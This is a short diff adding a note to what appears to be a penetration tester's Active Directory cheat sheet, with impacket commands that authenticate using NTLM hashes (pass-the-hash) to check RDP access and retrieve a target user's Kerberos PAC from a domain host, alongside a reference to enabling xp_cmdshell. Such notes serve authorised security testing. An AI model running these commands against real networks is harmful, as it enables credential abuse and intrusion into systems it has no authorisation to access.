@@ -30,3 +30,8 @@ enable_xp_cmdshell 1
 ```sh
 impacket-rdp_check -hashes :<ntlm> '<domain>/<user>:@10.165.14.42'
 ```
+
+# Get the PAC of the specified target user
+```sh
+impacket-getPac -targetUser <domain_user> -hashes :<ntlm> '<domain>/<user>:@10.165.14.42'
+```
